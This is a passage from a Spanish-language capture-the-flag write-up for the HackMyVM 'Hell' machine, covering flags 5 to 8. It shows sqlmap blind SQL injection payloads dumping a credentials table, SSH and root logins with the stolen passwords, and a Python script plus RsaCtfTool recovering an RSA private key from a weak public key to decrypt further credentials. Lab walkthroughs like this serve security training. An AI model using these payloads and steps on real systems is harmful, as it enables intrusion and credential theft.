+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: id=1' AND 8874=8874 AND 'SWKD'='SWKD
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: id=1' AND (SELECT 7615 FROM (SELECT(SLEEP(5)))bNvh) AND 'YbjW'='YbjW  
+---
+[</span><span class="az">22:45:31</span><span class="p">] [</span><span class="ve">INFO</span><span class="p">] the back-end DBMS is MySQL
+web server operating system: Linux Ubuntu 22.04 (jammy)
+web application technology: Apache 2.4.52
+back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)
+[</span><span class="az">22:45:31</span><span class="p">] [</span><span class="ve">INFO</span><span class="p">] fetching database names
+[</span><span class="az">22:45:31</span><span class="p">] [</span><span class="ve">INFO</span><span class="p">] fetching number of databases
+[</span><span class="az">22:45:31</span><span class="p">] [</span><span class="ve">INFO</span><span class="p">] retrieved: 3
+[</span><span class="az">22:45:31</span><span class="p">] [</span><span class="ve">INFO</span><span class="p">] retrieved: information_schema
+[</span><span class="az">22:45:33</span><span class="p">] [</span><span class="ve">INFO</span><span class="p">] retrieved: creds
+[</span><span class="az">22:45:33</span><span class="p">] [</span><span class="ve">INFO</span><span class="p">] retrieved: example
+available databases [3]:
+[*] creds
+[*] example
+[*] information_schema</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Ahora indicamos con el parametro <code class="language-plaintext highlighter-rouge">-D</code> la base de datos que es <code class="language-plaintext highlighter-rouge">creds</code> y usando el parametro <code class="language-plaintext highlighter-rouge">-tables</code> podemos dumpear todas las tablas de esta que solo es <code class="language-plaintext highlighter-rouge">users</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ sqlmap </span><span class="p">--batch --url </span><span class="am">"http://localhost/admin/index.php?id=1"</span><span class="p"> -D creds -tables  
+</span><span class="am">        ___
+       __H__
+ ___ ___[</span><span class="ro">,</span><span class="am">]_____ ___ ___  </span><span class="p">{</span><span class="c1">1.7.2#stable</span><span class="p">}</span><span class="am">
+|_ -| . [</span><span class="ro">'</span><span class="am">]     | .'| . |
+|___|_  [</span><span class="ro">(</span><span class="am">]_|_|_|__,|  _|
+      |_|V...       |_|   </span><span class="p">https://sqlmap.org
+</span><span class="p">
+[</span><span class="az">22:46:10</span><span class="p">] [</span><span class="ve">INFO</span><span class="p">] resuming back-end DBMS 'mysql'
+[</span><span class="az">22:46:10</span><span class="p">] [</span><span class="ve">INFO</span><span class="p">] testing connection to the target URL
+[</span><span class="az">22:46:10</span><span class="p">] [</span><span class="ve">INFO</span><span class="p">] the back-end DBMS is MySQL
+[</span><span class="az">22:46:10</span><span class="p">] [</span><span class="ve">INFO</span><span class="p">] fetching tables for database: 'creds'
+[</span><span class="az">22:46:10</span><span class="p">] [</span><span class="ve">INFO</span><span class="p">] fetching number of tables for database 'creds'
+[</span><span class="az">22:46:10</span><span class="p">] [</span><span class="ve">INFO</span><span class="p">] retrieved: 1
+[</span><span class="az">22:46:10</span><span class="p">] [</span><span class="ve">INFO</span><span class="p">] retrieved: users
+Database: creds
+[1 table]
++-------+
+| users |
++-------+</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Indicamos con el parametro <code class="language-plaintext highlighter-rouge">-T</code> la tabla <code class="language-plaintext highlighter-rouge">users</code> y ahora podemos usar directamente el parametro <code class="language-plaintext highlighter-rouge">-dump</code> que nos dumpea las columnas <code class="language-plaintext highlighter-rouge">username</code> y <code class="language-plaintext highlighter-rouge">password</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ sqlmap </span><span class="p">--batch --url </span><span class="am">"http://localhost/admin/index.php?id=1"</span><span class="p"> -D creds -T users -dump  
+</span><span class="am">        ___
+       __H__
+ ___ ___[</span><span class="ro">,</span><span class="am">]_____ ___ ___  </span><span class="p">{</span><span class="c1">1.7.2#stable</span><span class="p">}</span><span class="am">
+|_ -| . [</span><span class="ro">'</span><span class="am">]     | .'| . |
+|___|_  [</span><span class="ro">(</span><span class="am">]_|_|_|__,|  _|
+      |_|V...       |_|   </span><span class="p">https://sqlmap.org
+</span><span class="p">
+[</span><span class="az">22:46:31</span><span class="p">] [</span><span class="ve">INFO</span><span class="p">] resuming back-end DBMS 'mysql'
+[</span><span class="az">22:46:31</span><span class="p">] [</span><span class="ve">INFO</span><span class="p">] testing connection to the target URL
+[</span><span class="az">22:46:31</span><span class="p">] [</span><span class="ve">INFO</span><span class="p">] fetching columns for table 'users' in database 'creds'
+[</span><span class="az">22:46:31</span><span class="p">] [</span><span class="ve">INFO</span><span class="p">] retrieved: 2
+[</span><span class="az">22:46:31</span><span class="p">] [</span><span class="ve">INFO</span><span class="p">] retrieved: username
+[</span><span class="az">22:46:32</span><span class="p">] [</span><span class="ve">INFO</span><span class="p">] retrieved: password
+[</span><span class="az">22:46:33</span><span class="p">] [</span><span class="ve">INFO</span><span class="p">] fetching entries for table 'users' in database 'creds'
+[</span><span class="az">22:46:33</span><span class="p">] [</span><span class="ve">INFO</span><span class="p">] fetching number of entries for table 'users' in database 'creds'
+[</span><span class="az">22:46:33</span><span class="p">] [</span><span class="ve">INFO</span><span class="p">] retrieved: 3
+[</span><span class="az">22:46:33</span><span class="p">] [</span><span class="ve">INFO</span><span class="p">] retrieved: beltran48
+[</span><span class="az">22:46:33</span><span class="p">] [</span><span class="ve">INFO</span><span class="p">] retrieved: marco
+[</span><span class="az">22:46:34</span><span class="p">] [</span><span class="ve">INFO</span><span class="p">] retrieved: iamoswe2023!
+[</span><span class="az">22:46:35</span><span class="p">] [</span><span class="ve">INFO</span><span class="p">] retrieved: txhaka
+[</span><span class="az">22:46:35</span><span class="p">] [</span><span class="ve">INFO</span><span class="p">] retrieved: superrootpassword
+[</span><span class="az">22:46:37</span><span class="p">] [</span><span class="ve">INFO</span><span class="p">] retrieved: root
+Database: creds
+Table: users
+[3 entries]
++-------------------+----------+
+| password          | username |
++-------------------+----------+
+| beltran48         | marco    |
+| iamoswe2023!      | txhaka   |
+| superrootpassword | root     |
++-------------------+----------+</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Después de probar las credenciales logramos iniciar sesión como <code class="language-plaintext highlighter-rouge">txhaka</code> en la <code class="language-plaintext highlighter-rouge">172.17.0.3</code> a través del tunel creado con chisel, ahora podemos leer la quinta <code class="language-plaintext highlighter-rouge">flag</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ ssh </span><span class="p">txhaka@localhost
+txhaka@localhost's password: iamoswe2023!
+</span><span class="ve">txhaka@4b6bbb7b4072</span><span class="p">:</span><span class="az">~</span><span class="p">$ id
+uid=1000(txhaka) gid=1000(txhaka) groups=1000(txhaka)  
+</span><span class="ve">txhaka@4b6bbb7b4072</span><span class="p">:</span><span class="az">~</span><span class="p">$ hostname -I
+172.17.0.3
+</span><span class="ve">txhaka@4b6bbb7b4072</span><span class="p">:</span><span class="az">~</span><span class="p">$ cat flag.txt
+
+█▀ █▀█ █   █   █▄▄ █▀█ █▀█ █   █▀▀ ▄▀█ █▄ █
+▄█ ▀▀█ █▄▄ █   █▄█ █▄█ █▄█ █▄▄ ██▄ █▀█ █ ▀█
+
+Flag 5: HELL{7H3_B00L34N_15_4150_4_VU1N}
+
+</span><span class="ve">txhaka@4b6bbb7b4072</span><span class="p">:</span><span class="az">~</span><span class="p">$</span>
+</code></pre></div></div><br>
+
+</section>
+
+<section class="post" id="flag6">
+<br><h3 class="post-title">Flag 6</h3>
+<h4 class="post-title">HELL{7H3_5QL1_15_7H3_K3Y}</h4><br>
+
+<p class="plain-text">Entre las credenciales dumpeadas en la sqli podemos ver una contraseña de <code class="language-plaintext highlighter-rouge">root</code>, la cual es valida en este contenedor, nos convertimos en root y podemos leer la <code class="language-plaintext highlighter-rouge">flag</code> 6</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">txhaka@4b6bbb7b4072</span><span class="p">:</span><span class="az">~</span><span class="p">$ su root
+Password: superrootpassword
+</span><span class="ve">root@4b6bbb7b4072</span><span class="p">:</span><span class="az">~</span><span class="p"># id
+uid=0(root) gid=0(root) groups=0(root)
+</span><span class="ve">root@4b6bbb7b4072</span><span class="p">:</span><span class="az">~</span><span class="p"># hostname -I
+172.17.0.3
+</span><span class="ve">root@4b6bbb7b4072</span><span class="p">:</span><span class="az">~</span><span class="p"># cat /root/flag.txt
+
+█▀█ █▀█ █▀█ ▀█▀         ▄▀█ █▀▀ ▄▀█ █ █▄ █
+█▀▄ █▄█ █▄█  █  ▄ ▄ ▄   █▀█ █▄█ █▀█ █ █ ▀█
+
+Flag 6: HELL{7H3_5QL1_15_7H3_K3Y}
+
+</span><span class="ve">root@4b6bbb7b4072</span><span class="p">:</span><span class="az">~</span><span class="p">#</span>
+</code></pre></div></div><br>
+
+</section>
+
+<section class="post" id="flag7">
+<br><h3 class="post-title">Flag 7</h3>
+<h4 class="post-title">HELL{R54C7F7001_OR_M4NU41?}</h4><br>
+
+<p class="plain-text">En el directorio de root ademas de la flag encontramos un archivo <code class="language-plaintext highlighter-rouge">message.txt</code>, es un mensaje de <code class="language-plaintext highlighter-rouge">pascualropi</code> que nos dice que ha dejado sus credenciales ssh en el archivo <code class="language-plaintext highlighter-rouge">.enc</code> el cual se desencripta utilizando la clave privada correspondiente</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">root@4b6bbb7b4072</span><span class="p">:</span><span class="az">~</span><span class="p"># ls
+</span><span class="az">creds  </span><span class="p">flag.txt  message.txt
+</span><span class="ve">root@4b6bbb7b4072</span><span class="p">:</span><span class="az">~</span><span class="p"># cat message.txt
+
+From: pascualropi@hell.h4u
+
+Hi, I have left ssh credentials in the .enc file, remember to decrypt it with your private rsa key :)  
+
+</span><span class="ve">root@4b6bbb7b4072</span><span class="p">:</span><span class="az">~</span><span class="p">#</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Dentro del directorio <code class="language-plaintext highlighter-rouge">creds</code> encontramos el archivo .enc ademas de un <code class="language-plaintext highlighter-rouge">public.crt</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">root@4b6bbb7b4072</span><span class="p">:</span><span class="az">~/creds</span><span class="p"># ls  
+creds.enc  public.crt
+</span><span class="ve">root@4b6bbb7b4072</span><span class="p">:</span><span class="az">~/creds</span><span class="p">#</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Para descargarlos podemos copiar los archivos a <code class="language-plaintext highlighter-rouge">/dev/shm</code> y como el usuario <code class="language-plaintext highlighter-rouge">txhaka</code> usando <code class="language-plaintext highlighter-rouge">scp</code> copiarlos a nuestra maquina aprovechando la conexion ssh</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">root@4b6bbb7b4072</span><span class="p">:</span><span class="az">~/creds</span><span class="p"># cp * /dev/shm  
+</span><span class="ve">root@4b6bbb7b4072</span><span class="p">:</span><span class="az">~/creds</span><span class="p">#</span>
+</code></pre></div></div><br>
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ sshpass </span><span class="p">-p iamoswe2023! scp txhaka@localhost:</span><span class="am">'/dev/shm/*'</span><span class="p"> .  
+
+</span><span class="ve">❯ ls
+</span><span class="p"> creds.enc   public.crt</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">El archivo <code class="language-plaintext highlighter-rouge">public.crt</code> es una clave RSA <code class="language-plaintext highlighter-rouge">publica</code> de hecho bastante pequeña la cual en caso de lograr factorizarla podria ayudarnos a obtener la clave <code class="language-plaintext highlighter-rouge">privada</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ cat </span><span class="p">public.crt
+-----BEGIN PUBLIC KEY-----
+MIIBIDANBgkqhkiG9w0BAQEFAAOCAQ0AMIIBCAKBgQGN24SSfsyl/rFafZuCr54a
+BqEpk9fJDFa78Qnk177LTPwWgJPdgY6ZZC9w7LWuy9+fSFfDnF4PI3DRPDpvvqmB
+jQh7jykg7N4FUC5dkqx4gBw+dfDfytHR1LeesYfJI6KF7s0FQhYOioCVyYGmNQop
+lt34bxbXgVvJZUMfBFC6LQKBgQCkzWwClLUdx08Ezef0+356nNLVml7eZvTJkKjl
+2M6sE8sHiedfyQ4Hvro2yfkrMObcEZHPnIba0wZ/8+cgzNxpNmtkG/CvNrZY81iw
+2lpm81KVmMIG0oEHy9V8RviVOGRWi2CItuiV3AUIjKXT/TjdqXcW/n4fJ+8YuAML  
+UCV4ew==
+-----END PUBLIC KEY-----</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Iniciemos obteniendo sus valores, usando la libreria <code class="language-plaintext highlighter-rouge">Crypto</code> podemos abrir nuestra clave y con un sencillo <code class="language-plaintext highlighter-rouge">script</code> obtener solo 2 de sus valores que son <code class="language-plaintext highlighter-rouge">e</code> y <code class="language-plaintext highlighter-rouge">n</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="c1">#!/usr/bin/python3
+</span><span class="o">from </span><span class="p">Crypto.PublicKey </span><span class="o">import </span><span class="p">RSA
+
+file </span><span class="o">= </span><span class="no">open</span><span class="p">(</span><span class="s">"public.crt"</span><span class="p">, </span><span class="s">"r"</span><span class="p">)
+key </span><span class="o">= </span><span class="p">RSA.importKey(file.read())  
+
+e </span><span class="o">= </span><span class="p">key.e
+n </span><span class="o">= </span><span class="p">key.n
+
+</span><span class="no">print</span><span class="p">(</span><span class="no">f</span><span class="s">"e: </span><span class="p">{e}</span><span class="s">"</span><span class="p">)
+</span><span class="no">print</span><span class="p">(</span><span class="no">f</span><span class="s">"n: </span><span class="p">{n}</span><span class="s">"</span><span class="p">)</span>
+</code></pre></div></div><br>
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ python3 </span><span class="p">exploit.py
+e: 115728201506489397643589591830500007746878464402967704982363700915688393155096410811047118175765086121588434953079310523301854568599734584654768149408899986656923460781694820228958486051062289463159083249451765181542090541790670495984616833698973258382485825161532243684668955906382399758900023843171772758139  
+n: 279385031788393610858518717453056412444145495766410875686980235557742299199283546857513839333930590575663488845198789276666170586375899922998595095471683002939080133549133889553219070283957020528434872654142950289279547457733798902426768025806617712953244255251183937835355856887579737717734226688732856105517</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">En este caso la clave es bastante <code class="language-plaintext highlighter-rouge">pequeña</code>, hay que tener en cuenta que el valor de <code class="language-plaintext highlighter-rouge">n</code> es el resultado de la multiplicacion de 2 numeros primos, si usamos <a href="http://factordb.com/">factordb.com</a> logramos factorizar <code class="language-plaintext highlighter-rouge">n</code>, los 2 numeros que nos devuelve son definidos como <code class="language-plaintext highlighter-rouge">p</code> y <code class="language-plaintext highlighter-rouge">q</code></p>
+<a href="/hmv/hell/14.png" target="_blank"><div><p><img src="/hmv/hell/14.png"></p></div></a>
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">p </span><span class="o">= </span><span class="mi">13833273097933021985630468334687187177001607666479238521775648656526441488361370235548415506716907370813187548915118647319766004327241150104265530014047083  </span><span class="p">
+q </span><span class="o">= </span><span class="mi">20196596265430451980613413306694721666228452787816468878984356787652099472230934129158246711299695135541067207646281901620878148034692171475252446937792199  </span>
+</code></pre></div></div><br>
+
+<p class="plain-text">El valor de <code class="language-plaintext highlighter-rouge">m</code> se define como el resultado de <code class="language-plaintext highlighter-rouge">n</code> menos el resultado de <code class="language-plaintext highlighter-rouge">p + q - 1</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">m </span><span class="o">=</span><span class="p"> n </span><span class="o">-</span><span class="p"> (p </span><span class="o">+ </span><span class="p">q </span><span class="o">- </span><span class="mi">1</span><span class="p">)  </span>
+</code></pre></div></div><br>
+
+<p class="plain-text">La variable <code class="language-plaintext highlighter-rouge">d</code> se define como el resultado de la función modular multiplicativa inversa de <code class="language-plaintext highlighter-rouge">e</code> y <code class="language-plaintext highlighter-rouge">m</code>, asi que tambien es necesario definir la <a href="https://stackoverflow.com/questions/4798654/modular-multiplicative-inverse-function-in-python">función</a> modinv en python</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="o">def </span><span class="na">egcd</span><span class="p">(</span><span class="am">a</span><span class="p">, </span><span class="am">b</span><span class="p">):
+    </span><span class="o">if </span><span class="p">a </span><span class="o">== </span><span class="mi">0</span><span class="p">:
+        </span><span class="o">return</span><span class="p"> (b, </span><span class="mi">0</span><span class="p">, </span><span class="mi">1</span><span class="p">)
+    </span><span class="o">else</span><span class="p">:
+        g, y, x </span><span class="o">= </span><span class="p">egcd(b </span><span class="o">% </span><span class="p">a, a)
+        </span><span class="o">return</span><span class="p"> (g, x </span><span class="o">-</span><span class="p"> (b </span><span class="o">// </span><span class="p">a) </span><span class="o">* </span><span class="p">y, y)  
+
+</span><span class="o">def </span><span class="na">modinv</span><span class="p">(</span><span class="am">a</span><span class="p">, </span><span class="am">m</span><span class="p">):
+    g, x, y </span><span class="o">= </span><span class="p">egcd(a, m)
+    </span><span class="o">if </span><span class="p">g </span><span class="o">!= </span><span class="mi">1</span><span class="p">:
+        </span><span class="o">raise
+    else</span><span class="p">:
+        </span><span class="o">return </span><span class="p">x </span><span class="o">% </span><span class="p">m
+
+d </span><span class="o">= </span><span class="p">modinv(e, m)</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Si obtenemos todos estos valores podemos <code class="language-plaintext highlighter-rouge">construir</code> y mostrar la clave privada</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">key </span><span class="o">= </span><span class="p">RSA.construct((n, e, d, p, q))  
+</span><span class="no">print</span><span class="p">(key.exportKey().decode())</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Nuestro <code class="language-plaintext highlighter-rouge">script</code> final seria de la siguiente manera y al ejecutarlo este construye y nos muestra por pantalla la clave <code class="language-plaintext highlighter-rouge">privada</code> basandose en los valores conseguidos</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="c1">#!/usr/bin/python3
+</span><span class="o">from </span><span class="p">Crypto.PublicKey </span><span class="o">import </span><span class="p">RSA
+
+file </span><span class="o">= </span><span class="no">open</span><span class="p">(</span><span class="s">"public.crt"</span><span class="p">, </span><span class="s">"r"</span><span class="p">)
+key </span><span class="o">= </span><span class="p">RSA.importKey(file.read())
+
+e </span><span class="o">= </span><span class="p">key.e
+n </span><span class="o">= </span><span class="p">key.n
+
+p </span><span class="o">= </span><span class="mi">13833273097933021985630468334687187177001607666479238521775648656526441488361370235548415506716907370813187548915118647319766004327241150104265530014047083  </span><span class="p">
+q </span><span class="o">= </span><span class="mi">20196596265430451980613413306694721666228452787816468878984356787652099472230934129158246711299695135541067207646281901620878148034692171475252446937792199  </span><span class="p">
+
+m </span><span class="o">=</span><span class="p"> n </span><span class="o">-</span><span class="p"> (p </span><span class="o">+ </span><span class="p">q </span><span class="o">- </span><span class="mi">1</span><span class="p">)
+
+</span><span class="o">def </span><span class="na">egcd</span><span class="p">(</span><span class="am">a</span><span class="p">, </span><span class="am">b</span><span class="p">):
+    </span><span class="o">if </span><span class="p">a </span><span class="o">== </span><span class="mi">0</span><span class="p">:
+        </span><span class="o">return</span><span class="p"> (b, </span><span class="mi">0</span><span class="p">, </span><span class="mi">1</span><span class="p">)
+    </span><span class="o">else</span><span class="p">:
+        g, y, x </span><span class="o">= </span><span class="p">egcd(b </span><span class="o">% </span><span class="p">a, a)
+        </span><span class="o">return</span><span class="p"> (g, x </span><span class="o">-</span><span class="p"> (b </span><span class="o">// </span><span class="p">a) </span><span class="o">* </span><span class="p">y, y)
+
+</span><span class="o">def </span><span class="na">modinv</span><span class="p">(</span><span class="am">a</span><span class="p">, </span><span class="am">m</span><span class="p">):
+    g, x, y </span><span class="o">= </span><span class="p">egcd(a, m)
+    </span><span class="o">if </span><span class="p">g </span><span class="o">!= </span><span class="mi">1</span><span class="p">:
+        </span><span class="o">raise
+    else</span><span class="p">:
+        </span><span class="o">return </span><span class="p">x </span><span class="o">% </span><span class="p">m
+
+d </span><span class="o">= </span><span class="p">modinv(e, m)
+
+key </span><span class="o">= </span><span class="p">RSA.construct((n, e, d, p, q))
+</span><span class="no">print</span><span class="p">(key.exportKey().decode())</span>
+</code></pre></div></div><br>
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ python3 </span><span class="p">exploit.py
+-----BEGIN RSA PRIVATE KEY-----
+MIICOQIBAAKBgQGN24SSfsyl/rFafZuCr54aBqEpk9fJDFa78Qnk177LTPwWgJPd
+gY6ZZC9w7LWuy9+fSFfDnF4PI3DRPDpvvqmBjQh7jykg7N4FUC5dkqx4gBw+dfDf
+ytHR1LeesYfJI6KF7s0FQhYOioCVyYGmNQoplt34bxbXgVvJZUMfBFC6LQKBgQCk
+zWwClLUdx08Ezef0+356nNLVml7eZvTJkKjl2M6sE8sHiedfyQ4Hvro2yfkrMObc
+EZHPnIba0wZ/8+cgzNxpNmtkG/CvNrZY81iw2lpm81KVmMIG0oEHy9V8RviVOGRW
+i2CItuiV3AUIjKXT/TjdqXcW/n4fJ+8YuAMLUCV4ewIgSJiewFB8qwlK2nqa7taz
+d6DQtCKbEwXMl4BUeiJVRkcCQQEIH6FjRIVKckAWdknyGOzk3uO0fTEH9+097y0B
+A5OBHosBfo0agYxd5M06M4sNzodxqnRtfgd7R8C0dsrnBhtrAkEBgZ7n+h78BMxC
+h6yTdJ5rMTFv3a7/hGGcpCucYiadTIxfIR0R1ey8/Oqe4HgwWz9YKZ1re02bL9fn
+cIKouKi+xwIgSJiewFB8qwlK2nqa7tazd6DQtCKbEwXMl4BUeiJVRkcCIEiYnsBQ
+fKsJStp6mu7Ws3eg0LQimxMFzJeAVHoiVUZHAkA3pS0IKm+cCT6r0fObMnPKoxur  
+bzwDyPPczkvzOAyTGsGUfeHhseLHZKVAvqzLbrEdTFo906cZWpLJAIEt8SD9
+-----END RSA PRIVATE KEY-----</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Sin embargo esto es opcional ya que con <code class="language-plaintext highlighter-rouge">RsaCtfTool</code> obtenemos el mismo resultado de manera automatizada pasandole la clave publica y un ataque de tipo <code class="language-plaintext highlighter-rouge">wiener</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ RsaCtfTool </span><span class="p">--publickey public.crt --private --attack wiener --output private.crt  
+
+[*] Testing key public.crt.
+[*] Performing wiener attack on public.crt.
+ 25%|██████████▊                                | 154/612 [36628.83it/s]  
+[*] Attack success with wiener method !
+
+Results for public.crt:
+
+Private key :
+-----BEGIN RSA PRIVATE KEY-----
+MIICOQIBAAKBgQGN24SSfsyl/rFafZuCr54aBqEpk9fJDFa78Qnk177LTPwWgJPd
+gY6ZZC9w7LWuy9+fSFfDnF4PI3DRPDpvvqmBjQh7jykg7N4FUC5dkqx4gBw+dfDf
+ytHR1LeesYfJI6KF7s0FQhYOioCVyYGmNQoplt34bxbXgVvJZUMfBFC6LQKBgQCk
+zWwClLUdx08Ezef0+356nNLVml7eZvTJkKjl2M6sE8sHiedfyQ4Hvro2yfkrMObc
+EZHPnIba0wZ/8+cgzNxpNmtkG/CvNrZY81iw2lpm81KVmMIG0oEHy9V8RviVOGRW
+i2CItuiV3AUIjKXT/TjdqXcW/n4fJ+8YuAMLUCV4ewIgSJiewFB8qwlK2nqa7taz
+d6DQtCKbEwXMl4BUeiJVRkcCQQEIH6FjRIVKckAWdknyGOzk3uO0fTEH9+097y0B
+A5OBHosBfo0agYxd5M06M4sNzodxqnRtfgd7R8C0dsrnBhtrAkEBgZ7n+h78BMxC
+h6yTdJ5rMTFv3a7/hGGcpCucYiadTIxfIR0R1ey8/Oqe4HgwWz9YKZ1re02bL9fn
+cIKouKi+xwIgSJiewFB8qwlK2nqa7tazd6DQtCKbEwXMl4BUeiJVRkcCIEiYnsBQ
+fKsJStp6mu7Ws3eg0LQimxMFzJeAVHoiVUZHAkA3pS0IKm+cCT6r0fObMnPKoxur
+bzwDyPPczkvzOAyTGsGUfeHhseLHZKVAvqzLbrEdTFo906cZWpLJAIEt8SD9
+-----END RSA PRIVATE KEY-----</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Utilizando la clave <code class="language-plaintext highlighter-rouge">privada</code> podemos desencriptar el archivo <code class="language-plaintext highlighter-rouge">.enc</code> con <code class="language-plaintext highlighter-rouge">openssl</code>, al hacerlo nos muestra las credenciales <code class="language-plaintext highlighter-rouge">ssh</code> del usuario <code class="language-plaintext highlighter-rouge">pascual</code> hacia hell</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ openssl </span><span class="p">pkeyutl -decrypt -inkey private.crt -in creds.enc  
+
+Credentials for ssh in hell:
+
+Username: pascual
+Password: vulnwhatsapp123!</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Al utilizar las credenciales por <code class="language-plaintext highlighter-rouge">ssh</code> conseguimos una shell como el usuario <code class="language-plaintext highlighter-rouge">pascual</code> en la maquina real, podemos leer la flag 7 que es la <code class="language-plaintext highlighter-rouge">user flag</code> para <code class="language-plaintext highlighter-rouge">hackmyvm</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ ssh </span><span class="p">pascual@192.168.100.91
+pascual@192.168.100.91's password: vulnwhatsapp123!
+</span><span class="ve">pascual@hell</span><span class="p">:</span><span class="az">~</span><span class="p">$ id
+uid=1004(pascual) gid=1004(pascual) groups=1004(pascual)  
+</span><span class="ve">pascual@hell</span><span class="p">:</span><span class="az">~</span><span class="p">$ hostname -I
+192.168.100.91 172.17.0.1
+</span><span class="ve">pascual@hell</span><span class="p">:</span><span class="az">~</span><span class="p">$ cat flag.txt
+
+█▀█ ▄▀█ █▀ █▀▀ █ █ ▄▀█ █   █▀█ █▀█ █▀█ █
+█▀▀ █▀█ ▄█ █▄▄ █▄█ █▀█ █▄▄ █▀▄ █▄█ █▀▀ █
+
+Flag 7: HELL{R54C7F7001_OR_M4NU41?}
+
+</span><span class="ve">pascual@hell</span><span class="p">:</span><span class="az">~</span><span class="p">$</span>
+</code></pre></div></div><br>
+
+</section>
+
+<section class="post" id="flag8">
+<br><h3 class="post-title">Flag 8</h3>
+<h4 class="post-title">HELL{R3L4T1V3_R0U735_4R3_FUN!}</h4><br>
+
+<p class="plain-text">En la ruta <code class="language-plaintext highlighter-rouge">/var/mail</code> podemos ver un mensaje de <code class="language-plaintext highlighter-rouge">eddiedota</code> que nos dice que ha creado un compilado llamado <code class="language-plaintext highlighter-rouge">reports</code> que muestra los reportes pasandole un <code class="language-plaintext highlighter-rouge">id</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">pascual@hell</span><span class="p">:</span><span class="az">/var/mail</span><span class="p">$ ls
+eddie  pascual
+</span><span class="ve">pascual@hell</span><span class="p">:</span><span class="az">/var/mail</span><span class="p">$ cat pascual
+
+From: eddiedota@hell.h4u
+
+I have created a reports binary in /opt/reports/reports with which you can read the reports by passing an identifier as an argument to it  
+
+</span><span class="ve">pascual@hell</span><span class="p">:</span><span class="az">/var/mail</span><span class="p">$</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">El binario pertenece al usuario <code class="language-plaintext highlighter-rouge">eddie</code> y tiene privilegios <code class="language-plaintext highlighter-rouge">suid</code> para los usuarios</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">pascual@hell</span><span class="p">:</span><span class="az">~</span><span class="p">$ ls -l /opt/reports/reports  
+-rwsr-xr-x 1 eddie eddie 16208 Feb 16 00:24 </span><span class="err">/opt/reports/reports
+</span><span class="ve">pascual@hell</span><span class="p">:</span><span class="az">~</span><span class="p">$</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Al ejecutarlo nos dice que es obligatorio proporcionar un id como <code class="language-plaintext highlighter-rouge">argumento</code>, si le pasasamos una cadena de <code class="language-plaintext highlighter-rouge">texto</code> que no sea un numero sale del programa</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">pascual@hell</span><span class="p">:</span><span class="az">~</span><span class="p">$ /opt/reports/reports
+
+[</span><span class="ro">-</span><span class="p">] Usage: /opt/reports/reports &ltid for report>  
+
+</span><span class="ve">pascual@hell</span><span class="p">:</span><span class="az">~</span><span class="p">$</span>
+</code></pre></div></div><br>
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">pascual@hell</span><span class="p">:</span><span class="az">~</span><span class="p">$ /opt/reports/reports hola
+
+[</span><span class="ro">-</span><span class="p">] The input must be an identifier digit  
+
+</span><span class="ve">pascual@hell</span><span class="p">:</span><span class="az">~</span><span class="p">$</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Le pasamos algunos numeros y nos muestra diferentes <code class="language-plaintext highlighter-rouge">reportes</code> de vulnerabilidades</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
